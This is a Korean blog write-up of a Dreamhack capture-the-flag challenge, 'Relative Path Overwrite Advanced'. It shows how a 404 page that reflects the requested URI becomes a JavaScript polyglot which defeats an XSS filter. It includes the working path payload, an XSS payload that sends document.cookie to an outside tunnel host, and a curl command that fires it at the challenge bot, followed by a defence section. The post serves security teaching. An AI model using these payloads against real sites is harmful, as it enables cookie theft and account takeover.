---
layout: post
title:  "Dreamhack 워게임 Relative Path Overwrite Advanced 풀이 — 404 페이지의 reflected URI 를 JS polyglot 으로 만들어 필터 정의시키기"
date:   2026-05-16 22:30:00 +0900
categories: security web wargame dreamhack writeup rpo xss path-traversal polyglot
---

## 들어가며

Dreamhack 웹해킹 워게임 **Relative Path Overwrite Advanced** (id 440, 풀이자 715명+, Gold 4) 풀이입니다. [RPO (id 439)](/blog/2026/05/16/dreamhack-relative-path-overwrite-writeup/) 의 패치 버전.

전 버전 풀이는 *"filter.js 가 엉뚱한 응답을 받아서 `filter` 변수가 정의되지 않게 만들기"* — 그러면 vuln.php 의 inline 스크립트가 `if (typeof filter !== 'undefined')` 로 검사하니까 검사 자체가 skip 되어 우리 XSS 통과. 이번엔 그 검사가 **반대로** 바뀌었다:

```js
if (typeof filter === 'undefined') {
    param = "nope !!";
}
else {
    for (var i = 0; i < filter.length; i++) { ... }
}
```

**filter 가 정의되지 않으면** 그 자체로 nope. 즉 우리가 받은 응답이 **`filter` 변수를 정의하는 valid JS** 여야 한다.

거기다 `mod_rewrite` 가 `.js`/`.css` 모두 `/static/` 으로 강제 redirect, `ErrorDocument 404 /404.php` 가 추가됐는데, 이 `404.php` 가 결정적 단서:

```php
<?php
    header("HTTP/1.1 200 OK");
    echo $_SERVER["REQUEST_URI"] . " not found.";
?>
```

**REQUEST_URI 를 그대로 echo + 항상 200 OK 응답**. 이걸 JS 로 받으면 — 클라이언트가 요청한 URI 그 자체가 JS 코드. URI 만 잘 짜면 valid JS 가 응답으로 돌아온다.

핵심 한 줄 페이로드:

```
path = index.php/i;var/**/filter=0;//bar/?page=vuln&param=<XSS>
```

→ 봇이 그 URL 로 가면 base path = `/index.php/i;var/**/filter=0;//bar/`
→ 페이지의 `<script src="filter.js">` 는 `/index.php/i;var/**/filter=0;//bar/filter.js` 로 resolve
→ 그게 `mod_rewrite` 로 `/static/index.php/i;var/**/filter=0;//bar/filter` 로 redirect
→ 없으니 404 → `/404.php` 가 원본 URI 를 echo
→ 응답: `/index.php/i;var/**/filter=0;//bar/filter.js not found.`
→ JS 로 파싱: `/index.php/i` (정규식), `;`, `var /**/ filter=0`, `;`, `//...` (한줄주석)
→ `filter = 0` 정의됨, `filter.length === undefined` 이라 for 루프가 0번 돌고 XSS 가 raw 로 innerHTML 박힘.

🚩 **`DH{5b3d3705d88555128cdc3a322a5ae5b2}`**

> Note: 정보보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

---

## 1. 무엇이 바뀌었나 (Diff vs 원본 RPO)

### 1-1. 디렉토리 구조

원본:
```
filter.js  (웹루트에)
```

Advanced:
```
static/filter.js
000-default.conf:
  RewriteRule ^/(.*)\.(js|css)$ /static/$1 [L]
  ErrorDocument 404 /404.php
404.php  (REQUEST_URI 를 200 OK 로 echo)
```

### 1-2. vuln.php 의 검사 로직 반전

원본:
```js
if (typeof filter !== 'undefined') {
    for (...) { if (matches) param = "nope !!"; }
}
param_elem.innerHTML = param;
```

→ filter 가 정의되지 않으면 검사 skip, **innerHTML 그대로**.

Advanced:
```js
if (typeof filter === 'undefined') {
    param = "nope !!";
}
else {
    for (...) { if (matches) param = "nope !!"; }
}
param_elem.innerHTML = param;
```

→ filter 가 **정의돼야** 통과하고, 그 다음 for 루프에서 단어 검사 통과해야 함.

이 두 가지 패치가 합쳐서 — 원본의 *"filter.js 무력화로 검사 우회"* 트릭이 전부 막혔다.

---

## 2. 새로운 트릭의 단서들

### 2-1. `mod_rewrite` 의 함정 (?)

```
RewriteRule ^/(.*)\.(js|css)$ /static/$1 [L]
```

`.js` / `.css` 로 끝나는 어떤 path 도 `/static/`+동명 (확장자 빠진) 으로 강제 redirect. 즉 어떤 base 에서든 `<script src="filter.js">` 가 결국 `/static/<무언가>/filter` 같은 곳으로 가게 된다.

이게 의미: 그 곳에 **실제 파일이 거의 없을** 거라는 것. /static 디렉토리에는 `filter.js` 한 개뿐. 우리가 만든 path 가 거기 매칭될 가능성은 0.

→ 따라서 **거의 항상 404** 가 뜬다. 그리고 404 처리는 `/404.php` 가 한다.

### 2-2. `404.php` — REQUEST_URI reflection

```php
<?php
    header("HTTP/1.1 200 OK");
    echo $_SERVER["REQUEST_URI"] . " not found.";
?>
```

세 가지 사실:

- 200 OK 응답 — 클라이언트는 "성공" 으로 본다. `<script src>` 가 받으면 **실행 시도**.
- body = `<REQUEST_URI> not found.` — REQUEST_URI 는 raw URI (path + query), URL 인코딩 그대로.
- Content-Type 명시 없음 → PHP 기본 `text/html`. 하지만 `<script src>` 는 content-type 안 봄, raw body 를 JS 로 파싱.

**즉, 우리가 요청한 URI 가 valid JS 면, 응답 = "그 URI + ' not found.'" 가 JS 로 실행된다.**

→ 그 JS 안에서 `var filter = 0` (또는 비슷한 거) 를 박으면, vuln.php 의 `typeof filter === 'undefined'` 검사를 통과.

### 2-3. for 루프 통과 조건

```js
for (var i = 0; i < filter.length; i++) {
    if (param.toLowerCase().includes(filter[i])) {
        param = "nope !!";
        break;
    }
}
```

`filter.length` 가 0 이면 (또는 undefined) for 가 한 번도 안 돔. param 검사 X.

`filter = 0` 으로 만들면:
- `typeof filter === 'undefined'` → `false` (number 임)
- `filter.length` → `undefined`
- `0 < undefined` → `false` → 루프 skip
- **innerHTML 에 param 그대로 박힘**

`filter = ""` (빈 문자열) 도 동일. `filter = {}` 도 동일. 가장 짧은 건 `filter=0`.

---

## 3. JS Polyglot — URI = valid JS 만들기

목표: 클라이언트가 요청할 URI X 가 있고, 응답으로 `X not found.` 가 JS 로 파싱되어 `filter = 0` 을 만들어야 한다.

### 3-1. URI 의 시작 제약

브라우저가 만들 URI 는 `<base path>/filter.js` 형태. base path 는 우리가 만드는 봇 URL 의 path 에서 마지막 segment 떼낸 것.

봇 URL 은 반드시 `/index.php/...` 로 시작해야 한다 (PHP 가 index.php 를 dispatch 해서 vuln.php 를 include 해야 페이지가 렌더되니까). 따라서 URI 는:

```
/index.php/<우리가 통제하는 segments>/filter.js
```

### 3-2. 첫 토큰 — `/index.php/X` 가 JS 로 뭘 의미하나

`/` 가 첫 글자면 JS lexer 는 정규식 리터럴 시작으로 본다. `/index.php/` 까지가 한 정규식. 그 다음 글자가 **regex flag** 로 해석됨.

Valid JS regex flags: `g i m s u y` 만. 다른 글자가 오면 SyntaxError.

→ `<X>` 의 첫 글자는 `i` (또는 `g`/`m`/`s`/`u`/`y`) 여야 한다. 가장 자연스럽게 **`i`** 선택.

### 3-3. 그 뒤로 `;` 으로 statement 끊고 `var` 시작

`/index.php/i;...` — `i` 는 valid regex flag. `;` 으로 statement 종료. 그 다음에 `var filter=0` 을 넣어야 하는데...

문제: **URI 에 공백을 못 넣는다**. 브라우저가 `%20` 으로 인코딩하면 응답에도 `%20` 이 박혀서 JS 파서는 `var%20filter` 를 invalid identifier 로 본다 (`%` 는 modulo, `20filter` 는 invalid 숫자/식별자).

해결: `var` 와 `filter` 사이를 **block comment `/**/`** 로 잇기. JS 는 `/**/` 를 whitespace 처럼 처리. URI 에 `/**/` 를 넣으면 — 그런데 `/` 가 URL path delimiter 라 segment 가 쪼개진다. 괜찮음: URI 안에 `/**/` 가 있어도 응답 body 의 텍스트로는 `/**/` 그대로 박힘.

→ `var/**/filter=0` — JS 가 `var <whitespace> filter = 0` 로 본다. 유효.

### 3-4. 그 뒤로 나머지를 주석 처리

`var/**/filter=0;` 다음에 남는 건 응답의 뒷부분 (`...bar/filter.js not found.` 같은 것). 이걸 JS 로 안 파싱되게 한줄주석 `//` 으로 막아야 한다.

`//` 도 URI 에 그대로 넣을 수 있다 (path 의 빈 segment). 응답 body 에서 `//bar/filter.js not found.` 가 보이면 `//` 부터 줄 끝까지 주석. 줄 끝 = `not found.` 끝. 한 줄짜리 응답이라 전부 주석 처리됨.

### 3-5. 완성 URI

```
/index.php/i;var/**/filter=0;//bar/filter.js
```

(브라우저가 base path `/index.php/i;var/**/filter=0;//bar/` + relative `filter.js` 로 resolve)

응답: `/index.php/i;var/**/filter=0;//bar/filter.js not found.`

Node 에서 검증:

```bash
$ node -e "
  eval('/index.php/i;var/**/filter=0;//bar/filter.js not found.');
  console.log(typeof filter, filter);
"
number 0
```

✓ `filter = 0` 정의 성공.

---

## 4. XSS payload + 전체 발사

`filter = 0` 으로 검사 무력화됐으니, param 의 XSS 가 innerHTML 에 박힌다. CSP 없으므로 inline event handler 자유롭게 사용:

```html
<img src=x onerror="location.href='https://CF_URL/leak?c='+document.cookie">
```

bot path:

```
index.php/i;var/**/filter=0;//bar/?page=vuln&param=<XSS>
```

발사:

```bash
CF="https://anime-hispanic-crafts-gmc.trycloudflare.com"
XSS='<img src=x onerror="location.href='"'"$CF"/leak?c='"'"'+document.cookie">'
ENCODED_XSS=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$XSS")
BOT_PATH="index.php/i;var/**/filter=0;//bar/?page=vuln&param=$ENCODED_XSS"

curl -X POST "$URL/?page=report" --data-urlencode "path=$BOT_PATH"
```

attacker 로그:

```
::1 - - [17/May/2026 12:51:43] "GET /leak2?c=flag=DH{5b3d3705d88555128cdc3a322a5ae5b2} HTTP/1.1" 404 -
```

🚩 **`DH{5b3d3705d88555128cdc3a322a5ae5b2}`**

---

## 5. 왜 이게 통하는가 — 한 번 더 풀어 쓰기

이 문제의 모든 안전장치를 정리하면:

| 방어 | 무엇을 막는가 | 무엇이 무너뜨리나 |
|------|-----------|------------------|
| filter.js → /static/ 경로 분리 | 단순 RPO 우회 | (직접 못 우회) |
| `mod_rewrite` 로 .js → /static | RPO 로 다른 PHP 응답 받기 | 응답이 항상 404 로 가서, 사용한 게 404.php |
| `if (typeof filter === 'undefined')` 반전 | filter 무력화 트릭 | **filter 변수를 응답으로 정의** |
| Selenium 봇 (XSS 검증 채널) | 직접 cookie 접근 | 정상 XSS 로 우회 |

**놓친 단 한 가지:** `404.php` 가 `REQUEST_URI` 를 그대로 echo. 클라이언트가 통제하는 raw URI 가 응답 body 가 됨. 거기다 200 OK 로 응답해서 브라우저가 "성공한 script" 로 실행 시도.

올바른 방어:

1. `404.php` 가 HTTP 404 status 를 그대로 돌려보내야 함 (`<script src>` 가 4xx 응답은 실행 안 함).
2. REQUEST_URI 를 echo 한다면 HTML escape (`htmlspecialchars`) — script 로 받을 때는 무관하지만 다른 reflection 공격은 막힘.
3. 더 근본적으로: `<script src>` 응답에는 Content-Type 검증 (Chrome 의 X-Content-Type-Options: nosniff 강제).

---

## 6. 시도한 것 중 실패한 것들 — 회고

### 6-1. 헛수고 1 — 원본 RPO 트릭이 그대로 통할까 (5분)

처음에 *"filter.js 가 또 엉뚱한 응답 받게 만들면 되겠지"* 로 시작. `/index.php/X?page=vuln` 보내봤는데 `filter.js` 가 `/static/<something>/filter` 로 redirect 되어 404. 어차피 404 라서 응답이 비어 있을 거라 예상 → vuln.php 가 `typeof filter === 'undefined'` 면 nope.

vuln.php 코드를 다시 읽고 검사 방향이 **반전** 됐다는 걸 깨달음. *"filter 가 정의돼야"* 통과.

**다음엔:** patched 버전 문제는 **vuln.php 의 검사 로직부터 diff** 로 봐야 한다. 환경 변화 (filter.js 위치, mod_rewrite) 만 보지 말고.

### 6-2. 헛수고 2 — XSS payload 의 single quote 이스케이프 (10분)

bash 에서 single quote 안에 single quote 박는 게 안 돼서 `\x27` literal 그대로 들어가 첫 시도 실패. 봇이 cloudflared `/` 만 치고 `/leak2` 안 침. 로그 확인하고 `printf "%s'%s" ...` 패턴으로 수정.

**다음엔:** XSS payload 짤 때 **bash 가 아니라 처음부터 python3 -c** 로 만들어서 따옴표 escape 신경 안 쓰기. 또는 base64 인코딩.

### 6-3. (안 빠진 함정) — 브라우저의 `//` 정규화

`//` 가 path 중간에 있을 때 일부 브라우저나 프록시가 `/` 로 collapse 할 가능성. 다행히 Chrome 은 보존. 만약 collapse 됐다면 응답이 `/index.php/i;var/**/filter=0;/bar/filter.js not found.` 가 돼서 `//` comment 가 사라져 SyntaxError. 백업 플랜으로는 `/**/...*/` block comment 로 끝까지 감싸는 방법이 있다.

---

🚩 `DH{5b3d3705d88555128cdc3a322a5ae5b2}`
